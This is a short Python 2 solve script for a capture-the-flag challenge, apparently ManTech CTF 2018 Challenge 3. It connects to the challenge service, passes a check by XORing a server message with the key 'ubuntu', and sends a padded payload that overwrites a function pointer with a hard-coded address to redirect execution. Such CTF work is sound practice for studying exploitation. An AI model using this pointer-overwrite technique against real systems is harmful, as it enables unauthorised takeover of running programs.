##################################################################################################
'''
// @Project      ManTech CTF 2018 Challenge 3
// @Author       Saccharide
'''
##################################################################################################


import socket
import os
import sys

# Xoring ubuntu with fortune message
pad = "ubuntu"
def ttt(s):
        ret = []
        for i in range(len(s)):
                tmp = ord(s[i]) ^ ord(pad[i%len(pad)])
                ret.append(chr(tmp))
        return "".join(ret)

# parsing the fortune message given by the server
def getFortune(fortune):
	return fortune.split("*Here's your fortune!*")[1].split("\n\nGive me your edits.\n")[0].split("\n\n")[1]


# Main program

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# Connect to the server, replace "localhose" to "hackcoes.com" for a live test
s.connect(("localhost",31337))

# First phase
whoRu = s.recv(1024)
print whoRu

s.send("ubuntu")

# Second phase
greeting = s.recv(2048)
print greeting

fortune = s.recv(1024)
print fortune

# Parse the fortune message
fortune = getFortune(fortune)
print fortune
fortune = fortune+"\n"

# Xoiring the message
output = ttt(fortune)
print output


# Testing the len of the original message with our xored message
print "fortune len",len(fortune)
print "output len",len(output)

# Send it to the server
s.send(bytearray(output))

# Prints out the response from server
print s.recv(1024)
print s.recv(1024)


# Tells the server our new password, no need to buffer overflow for this one
new_password = "A"*155#+"\x82\x91\x04\x08"
s.send(bytearray(new_password))
print s.recv(1024)

# Last phase, we need to rediret the memory location to magickey_exit, becuase this password is being used as a function pointer
password = "A"*20+ "\x82\x91\x04\x08" #"\x73\x8B\x04\x08"

s.send(bytearray(password))


print s.recv(1024)
print s.recv(1024)

# Profit
print s.recv(1024)
print s.recv(1024)


